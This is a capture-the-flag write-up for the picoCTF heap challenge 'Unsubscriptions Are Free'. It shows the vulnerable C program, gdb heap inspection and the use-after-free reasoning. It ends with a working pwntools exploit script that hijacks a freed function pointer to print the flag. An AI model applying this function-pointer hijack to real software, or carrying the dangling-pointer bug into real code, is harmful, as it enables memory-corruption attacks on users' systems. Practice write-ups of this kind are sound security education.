### Unsubscriptions Are Free

Download the files and `cat vuln.c`.

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
}

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  	puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}

void m(){
	puts("Account created.");
}

void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}

void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

void printMenu(){
 	puts("Welcome to my stream! ^W^");
 	puts("==========================");
 	puts("(S)ubscribe to my channel");
 	puts("(I)nquire about account deletion");
 	puts("(M)ake an Twixer account");
 	puts("(P)ay for premium membership");
	puts("(l)eave a message(with or without logging in)");
	puts("(e)xit");
}

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}
```

As we can see there is a function that prints the flag.

```c
void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}
```

Also, it's 32-bit binary.

```bash
➜  Unsubscriptions Are Free git:(main) ✗ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=89699d062dc4f47448ba7c5c03105267c060ce30, not stripped
```

It's a typical `uaf` heap challenge. 

We also see that there is a `doProcess()` function which executes code.

```c
void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}
```

The bug seems to be here.

```c
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}
```

It frees a pointer and does not nullify the buffer so it can be used after that. (Use-After-Free). 

Initial guess is to play with the `heap`, allocate some memory and then free it so that we have the address of `hahaexploitgobrrr` in heap so we can call it with `doProcess()`. 

```bash
gef➤  checksec
[+] checksec for '/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/Unsubscriptions Are Free/vuln'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

`PIE` is disabled, that means the address of `hahaexploitgobrrr` is known. 

```bash
void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}
```

Let's open a debugger to proceed.

#### Debugging

We start by making an account with `M`.

```gdb
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
M
===========================
Registration: Welcome to Twixer!
Enter your username: 
AAAABBBB 
```

Take a look into `heap chunks`.

```gdb
gef➤  heap chunks
Chunk(addr=0x804c010, size=0x190, flags=PREV_INUSE)
    [0x0804c010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x804c1a0, size=0x10, flags=PREV_INUSE)
    [0x0804c1a0     f6 89 04 08 c0 c5 04 08 00 00 00 00 11 04 00 00    ................]
Chunk(addr=0x804c1b0, size=0x410, flags=PREV_INUSE)
    [0x0804c1b0     41 41 41 41 42 42 42 42 0a 00 00 00 00 00 00 00    AAAABBBB........]
Chunk(addr=0x804c5c0, size=0x70, flags=PREV_INUSE)
    [0x0804c5c0     41 41 41 41 42 42 42 42 0a 00 00 00 00 00 00 00    AAAABBBB........]
Chunk(addr=0x804c630, size=0x219d8, flags=PREV_INUSE)
    [0x0804c630     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x804c630, size=0x219d8, flags=PREV_INUSE)  ←  top chunk
gef➤  x/20gx 0x804c1b0-0x10
0x804c1a0:	0x0804c5c0080489f6	0x0000041100000000
0x804c1b0:	0x4242424241414141	0x000000000000000a <-- this is where we write
```

If we create account again, it will go to the same place.

```gdb
gef➤  x/20gx 0x804c1b0-0x10
0x804c1a0:	0x0804c630080489f6	0x0000041100000000
0x804c1b0:	0x4444444443434343	0x000000000000000a
```

If we free the chunk with `I` and then send `L` to to allocate a new buffer, we see we got this message.

```gdb
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
```

That means we have overwritten the `pc`. Not sure if this is the intended solution, but works and it's 100% reliable.

#### Summary

* Create an account with `M` and input a random string.
* Delete - free the account with `I`.
* Leak the address of `hahaexploitgobrrr`.
* Allocate a new chunk with `L` and write the leaked address of `hahaexploitgobrrr`.

#### Exploit

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'i386'

r = remote('mercury.picoctf.net', 58574)

# Create account
r.sendline('M')
r.sendline('w3t')

# Delete account
r.sendline('I')
r.sendline('Y')

# Leak address
r.sendline('S')
r.recvuntil('leak...')
leak = int(r.recvline().strip(), 16)
info(f'Leak: {leak:#04x}')

# Leave a message
r.sendline('L')
r.sendline(p32(leak))

success(f'Flag --> {r.recvline_contains(b"pico").strip().decode()}')
```

```bash
➜  Unsubscriptions Are Free git:(main) ✗ python solver.py
[+] Opening connection to mercury.picoctf.net on port 58574: Done
[*] Leak: 0x80487d6
[+] Flag --> picoCTF{XXX}
[*] Closed connection to mercury.picoctf.net port 58574
```

